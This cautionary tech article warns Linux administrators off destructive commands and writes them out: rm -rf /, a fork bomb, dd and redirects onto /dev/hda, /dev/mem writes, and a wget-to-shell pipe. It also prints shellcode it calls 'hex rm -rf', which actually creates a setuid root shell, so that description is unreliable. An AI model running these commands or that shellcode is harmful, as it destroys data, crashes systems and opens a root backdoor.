The Linux commands you should NEVER use
======
Unless, of course, you like killing your machines.

Spider-Man's credo is, "With great power comes great responsibility." That's also a wise attitude for Linux system administrators to adopt.

No! Really! Thanks to DevOps and cloud orchestration, a Linux admin can control not merely a single server, but tens of thousands of server instances. With one stupid move--like [not patching Apache Struts][1]--you can wreck a multibillion-dollar enterprise.

Failing to stay on top of security patches is a strategic business problem that goes way above the pay grade of a system administrator. But there are many simple ways to blow up Linux servers, which do lie in the hands of sysadmins. It would be nice to imagine that only newbies make these mistakes--but we know better.

Here are infamous commands that enable anyone with root access to wreak havoc.

A word of caution: Never, ever run any of these on a production system. They will harm your system. Don't try this at home! Don't try it at the office, either.

That said, onward!

### rm -rf /

Want to ruin a Linux system in no time flat? You can't beat this classic "worst command ever." It deletes everything--and I mean everything--from your system.

Like most of these [Linux commands][2], the core program, `rm`, is very handy. It enables you to delete even the most stubborn files. But you're in deep trouble when you combine `rm` with those two flags: `-r`, which forces recursive deletion through all subdirectories, and `-f`, which forces deletion of read-only files without confirmation. If you run it from the / root directory, you'll wipe every last bit of data on your entire drive.

Just imagine trying to explain that to the boss!

Now, you might think, "I could never make such a dumb mistake." Oh, my friend, pride goes before a fall. Consider [this cautionary tale from a sysadmin on Reddit][3]:

> I've been in IT a long time, but today, in Linux, as root, I `rm -r` the wrong path.
>
> Long story short, I had to copy a bunch of dirs from one path to another and, as you do, I did a couple of `cp -R` to copy the needed about.
>
> In my wisdom, I tapped the up arrow a couple of times as the dirs to copy are similarly named but they're in amongst a whole bunch of other stuff.
>
> Anyway, I tapped too far and being distracted as I typed on Skype and Slack and WhatsApp web as well as taking a call from Sage, my brained auto-piloted in: `rm -R ./videodir/* ../companyvideodirwith651vidsin/`

And there went corporate video file after file into the void. Fortunately, after much frantic pounding of `control-C`, the sysadmin managed to stop the command before it deleted too many files. But let this be a warning to you: Anyone can make this mistake.

True, most modern systems warn you in great big letters before you make this blunder. However, if you are busy or distracted as you pound away on the keyboard, you can type your system into a black hole.

There are sneakier ways to get rm -rf. Consider the code below:

`char esp[] __attribute__ ((section(".text"))) = "\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68"`

`"\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99"`

`"\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7"`

`"\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56"`

`"\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31"`

`"\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69"`

`"\x6e\x2f\x73\x68\x00\x2d\x63\x00"`

`"cp -p /bin/sh /tmp/.beyond; chmod 4755`

`/tmp/.beyond;";`

What is it? It's the hex version of `rm -rf`. Don't run any command unless you know what it is.

### Bash fork bomb

Since we are on the topic of odd-looking code, consider this line:
```
:(){ :|: & };:
```

It may look cryptic to you, but to me, it looks like the infamous [Bash fork bomb][4]. All it does is start new Bash shells, over and over again, until all your system resources are consumed and the system crashes.

An up-to-date Linux system shouldn't do this. Note, I said shouldn't. I didn't say won't. Properly set up, Linux systems block this behavior from causing too much harm by setting user limits. Usually, users are restricted to allocate only the memory that the machine has available. But if you run the above (or some other [Bash fork bomb variants][5]) as root, you can still knock a server off until it's rebooted.

### Overwriting the hard drive with garbage

There are times you want to zap the data from a disk, but for that job, you should use a tool such as [Darik's Boot and Nuke (DBAN)][6].

But for just making a royal mess of your storage, it's hard to beat running:
```
Any command > /dev/hda
```

When I say "any command," I mean any command with output. For example:
```
ls -la > /dev/hda
```

…pipes the directory listing to your main storage device. Given time, and root privileges, this overwrites all the data on your drive. That's always a good way to start the day in a blind panic--or turn it into a [career-limiting crisis][7].

### Wipe that drive!

Another all-time favorite way to smoke storage is to run:
```
dd if=/dev/zero of=/dev/hda
```

With this command, you're writing data to a drive. The `dd` command pulls its data from the special file, which outputs an infinity of zeros, and pours those zeros all over the hard drive.

Now /dev/zero may sound like a really silly idea, but it has real uses. For example, you can use it to [clear unused space in a partition with zeros][8]. This makes compressing an image of the partition much smaller for data transfer or archival uses.

On the other hand, its close relative, `dd if=/dev/random of=/dev/hda`, isn't good for much except ruining your day. If you ran this command (please don't), you would cover your storage with random crap. As a half-assed way to hide your secret plans to take over the office coffee machine, it's not bad, but DBAN is a better tool for that job.

### /dev/null for the loss

Perhaps it's because our data is precious to us and our confidence in backups is minimal, but many of these "Never do this!" Linux commands have the result of wiping a hard disk or other storage repository. Case in point: Another pair of ways to ruin your storage is to run `mv / /dev/null` or `>mv ` /dev/null`.

In the former case, you as the root user are sending all the drive's data into the ever-hungry maw of `/dev/null`. In the latter, you're just feeding your home directory into the same vault of emptiness. In either case, short of restoring from a backup, you won't be seeing any of that data ever again.

When it comes to containers, don't forget data persistence or data storage. 451 Research offers advice.

[Get the report][9]

Heck, accounting didn't really need up-to-date receivables files anyway, did they?

### Formatting the wrong drive

Sometimes you must format a drive with a command like:
```
mkfs.ext3 /dev/hda
```

…which formats the primary hard drive with the ext3 file system. But, wait one darn second! What are you doing formatting your main drive! Aren't you using it?

Make doubly sure when you're formatting drives--be they solid state, flash, or good old ferrous oxide--that you're formatting the partition that really needs it and not one that's already in use.

### Kernel panics

Some Linux commands do not put your machine down for the long count. However, a variety of them can cause the kernel to panic. Normally, these failures are caused by hardware issues, but you can do it to yourself.

When you encounter a kernel panic, you need to reboot the system to get back to work. In some cases, that's a mild annoyance; in others--such as a production system under heavy load--it's a big deal. Examples include:
```
dd if=/dev/random of=/dev/port

 echo 1 > /proc/sys/kernel/panic

 cat /dev/port

 cat /dev/zero > /dev/mem
```

All of these cause kernel panics.

Never run a command unless you know what it's supposed to do, which reminds me…

### Be wary of unknown scripts

Young or lazy sysadmins like to borrow scripts written by other people. Why reinvent the wheel, right? So, they find a cool script that promises to automate and check all backups. They grab it with a command such as:
```
wget https://ImSureThisIsASafe/GreatScript.sh -O- | sh
```

This downloads the script and then shoots it over to the shell to run. No fuss, no muss, right? Wrong. That script may be poisoned with malware. Sure, Linux is safer than most operating systems by default, but if you run unknown code as root, anything can happen. The danger is not only in maliciousness; the script author's stupidity is equally as harmful. You can be bitten by someone else's undebugged code--because you didn't take the time to even read it through.

You'd never do something like that? Tell me, all those [container images you're running on Docker][10]? Do you know what they're really running? I know too many sysadmins who run containers without verifying what's really in them. Don't be like them.

### Shutdown

The moral of these stories is simple. With Linux, you get an enormous amount of control over your system. You can make your servers do almost anything. But you must make certain that you use that power conscientiously. If you don't, you can wreck not just your servers, but your job and your company. Be like Spider-Man, and use your power responsibly.

Did I miss any? Tweet me at [@sjvn][11] and [@enterprisenxt][12] to tell me which Linux commands are on your "[Never use this!][13]" list.

--------------------------------------------------------------------------------

via: https://www.hpe.com/us/en/insights/articles/the-linux-commands-you-should-never-use-1712.html

作者：[Steven Vaughan-Nichols][a]
译者：[译者ID](https://github.com/译者ID)
校对：[校对者ID](https://github.com/校对者ID)

本文由 [LCTT](https://github.com/LCTT/TranslateProject) 原创编译，[Linux中国](https://linux.cn/) 荣誉推出

[a]:https://www.hpe.com/us/en/insights/contributors/steven-j-vaughan-nichols.html
[1]:http://www.zdnet.com/article/equifax-blames-open-source-software-for-its-record-breaking-security-breach/
[2]:https://www.hpe.com/us/en/insights/articles/16-linux-server-monitoring-commands-you-really-need-to-know-1703.html
[3]:https://www.reddit.com/r/sysadmin/comments/732skq/after_21_years_i_finally_made_the_rm_boo_boo/
[4]:https://www.cyberciti.biz/faq/understanding-bash-fork-bomb/
[5]:https://unix.stackexchange.com/questions/283496/why-do-these-bash-fork-bombs-work-differently-and-what-is-the-significance-of
[6]:https://dban.org/
[7]:https://www.hpe.com/us/en/insights/articles/13-ways-to-tank-your-it-career-1707.html
[8]:https://unix.stackexchange.com/questions/44234/clear-unused-space-with-zeros-ext3-ext4
[9]:https://www.hpe.com/us/en/resources/solutions/enterprise-devops-containers.html?jumpid=in_insights~510287587~451_containers~badLinux
[10]:https://www.oreilly.com/ideas/five-security-concerns-when-using-docker
[11]:http://www.twitter.com/sjvn
[12]:http://www.twitter.com/enterprisenxt
[13]:https://www.youtube.com/watch?v=v79fYnuVzdI
